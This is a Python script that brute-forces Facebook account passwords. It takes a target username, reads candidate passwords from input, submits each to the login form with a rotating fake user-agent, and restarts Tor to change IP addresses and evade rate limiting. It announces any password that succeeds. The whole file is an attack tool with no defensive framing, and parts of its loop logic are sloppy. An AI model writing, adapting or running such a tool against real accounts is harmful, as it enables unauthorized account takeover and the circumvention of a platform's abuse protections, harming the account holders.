##Rafael Rodrigues

red = '\033[31m'
gr = '\033[32m'
from os import system
from mechanize import Browser
from random import choice
from sys import argv
from time import sleep
def main():
    username = argv[1]
    set = 0
    system('/etc/init.d/tor stop > /dev/null')
    system('/etc/init.d/tor start > /dev/null')
    while True:
        set +=1
        passw = input('')
        setup_tentative(username,passw)
        if(set == 20):
            system('/etc/init.d/tor restart > /dev/null')
            sleep(10)
def sorteed():
    list = ['Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]',
            'Mozilla/5.0 (Linux; Android 7.0; SM-G570M Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/192.0.0.34.85;]',
            'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/Sprint]',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
            'Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko']
    return choice(list)
def setup_tentative(username,passw):
    browser = Browser()
    browser.addheaders = [('User-Agent', sorteed())]
    browser.set_handle_robots(False)
    bool = False
    while bool==False:
        try:
            browser.open('https://facebook.com/')
            browser.select_form(nr=0)
            bool=True
        except:
            system('/etc/init.d/tor restart > /dev/null')
            sleep(20)
    browser.form['email'] = username
    browser.form['pass'] = passw
    response = browser.submit()
    link = response.geturl()
    browser.close()
    link = link.split('/')
    ok = ''

    for l in link:
        if b'Find Friends' in response.read():
            ok = False
    if(ok == False):
        system('/etc/init.d/tor stop')
        system('clear')
        print(gr+'Senha '+red+passw+gr+' detectada para '+red+username)
        exit(0)
main()
